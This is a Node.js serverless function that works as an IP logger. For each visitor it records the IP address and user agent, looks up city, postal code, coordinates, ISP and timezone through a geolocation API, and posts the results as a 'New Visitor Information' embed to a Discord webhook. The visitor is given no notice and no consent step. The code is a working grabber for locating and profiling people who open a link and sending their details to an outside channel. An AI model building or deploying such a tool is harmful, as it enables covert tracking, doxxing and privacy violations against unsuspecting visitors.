const fetch = require('node-fetch');

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    // Get client IP - handle multiple IPs in x-forwarded-for
    let clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    // Clean the IP address
    if (clientIP.includes(',')) {
      clientIP = clientIP.split(',')[0].trim();
    }
    
    // Remove IPv6 prefix if present
    clientIP = clientIP.replace(/^::ffff:/, '');
    
    console.log('Client IP:', clientIP);
    
    const userAgent = req.headers['user-agent'];
    const apiKey = process.env.BIGDATACLOUD_API_KEY || 'demo';
    
    console.log('Using API Key:', apiKey === 'demo' ? 'demo key' : 'custom key');
    
    // BigDataCloud API call with better error handling
    let ipInfo = {};
    let timezoneInfo = {};
    
    try {
      const ipInfoResponse = await fetch(
        `https://api.bigdatacloud.net/data/client-ip`,
        {
          headers: {
            'Accept': 'application/json',
          }
        }
      );
      
      console.log('IP API Status:', ipInfoResponse.status);
      
      // Check if response is JSON
      const contentType = ipInfoResponse.headers.get('content-type');
      if (!contentType || !contentType.includes('application/json')) {
        const textResponse = await ipInfoResponse.text();
        console.log('Non-JSON response from IP API:', textResponse.substring(0, 200));
        throw new Error('BigDataCloud IP API returned non-JSON response');
      }
      
      const ipData = await ipInfoResponse.json();
      console.log('IP Data received');
      
      // Now get geolocation using the IP
      const geoResponse = await fetch(
        `https://api.bigdatacloud.net/data/ip-geolocation?key=${apiKey}&ip=${clientIP}&localityLanguage=en`,
        {
          headers: {
            'Accept': 'application/json',
          }
        }
      );
      
      console.log('Geo API Status:', geoResponse.status);
      
      if (!geoResponse.ok) {
        const errorText = await geoResponse.text();
        console.log('Geo API Error:', errorText);
        throw new Error(`Geo API failed: ${geoResponse.status}`);
      }
      
      const geoContentType = geoResponse.headers.get('content-type');
      if (!geoContentType || !geoContentType.includes('application/json')) {
        const textResponse = await geoResponse.text();
        console.log('Non-JSON response from Geo API:', textResponse.substring(0, 200));
        throw new Error('BigDataCloud Geo API returned non-JSON response');
      }
      
      ipInfo = await geoResponse.json();
      
      // Get timezone information
      if (ipInfo.location && ipInfo.location.latitude) {
        const timezoneResponse = await fetch(
          `https://api.bigdatacloud.net/data/timezone-by-location?latitude=${ipInfo.location.latitude}&longitude=${ipInfo.location.longitude}&key=${apiKey}&localityLanguage=en`
        );
        
        if (timezoneResponse.ok) {
          timezoneInfo = await timezoneResponse.json();
        }
      }
      
    } catch (apiError) {
      console.error('API Error:', apiError.message);
      // Fallback to simple IP detection
      ipInfo = {
        ip: clientIP,
        location: {
          city: 'Unknown',
          region: 'Unknown',
          country: { name: 'Unknown' },
          latitude: 0,
          longitude: 0,
          postalCode: 'Unknown'
        },
        network: {
          carrier: { name: 'Unknown' },
          organisation: 'Unknown'
        },
        country: {
          name: 'Unknown',
          code: 'Unknown'
        }
      };
      
      timezoneInfo = {
        timeZoneName: 'Unknown',
        gmtOffsetString: 'Unknown'
      };
    }

    // Prepare Discord embed
    const discordEmbed = {
      embeds: [{
        title: "🌐 New Visitor Information",
        color: 0x00ff00,
        fields: [
          {
            name: "IP Address",
            value: `\`\`\`${clientIP}\`\`\``,
            inline: false
          },
          {
            name: "Location",
            value: `**Country:** ${ipInfo.country?.name || 'Unknown'}\n**Region:** ${ipInfo.location?.region || 'Unknown'}\n**City:** ${ipInfo.location?.city || 'Unknown'}\n**Postal Code:** ${ipInfo.location?.postalCode || 'Unknown'}`,
            inline: true
          },
          {
            name: "Coordinates",
            value: `**Lat:** ${ipInfo.location?.latitude || 'Unknown'}\n**Long:** ${ipInfo.location?.longitude || 'Unknown'}`,
            inline: true
          },
          {
            name: "Network",
            value: `**ISP:** ${ipInfo.network?.carrier?.name || 'Unknown'}\n**Organization:** ${ipInfo.network?.organisation || 'Unknown'}`,
            inline: true
          },
          {
            name: "Timezone",
            value: `**Name:** ${timezoneInfo.timeZoneName || 'Unknown'}\n**Offset:** ${timezoneInfo.gmtOffsetString || 'Unknown'}`,
            inline: true
          },
          {
            name: "Device Info",
            value: `**User Agent:** \`${userAgent?.substring(0, 100) || 'Unknown'}${userAgent?.length > 100 ? '...' : ''}\``,
            inline: false
          }
        ],
        footer: {
          text: `Logged at ${new Date().toISOString()}`
        }
      }]
    };

    // Send to Discord webhook (optional)
    if (process.env.DISCORD_WEBHOOK_URL) {
      try {
        await fetch(process.env.DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(discordEmbed)
        });
        console.log('Discord webhook sent successfully');
      } catch (discordError) {
        console.error('Discord webhook error:', discordError.message);
      }
    }

    // Return data to client
    res.status(200).json({
      success: true,
      message: "Information logged successfully",
      data: {
        ip: clientIP,
        location: ipInfo.location || {},
        country: ipInfo.country || {},
        network: ipInfo.network || {},
        timezone: timezoneInfo,
        userAgent: userAgent
      }
    });

  } catch (error) {
    console.error('Server Error:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
};
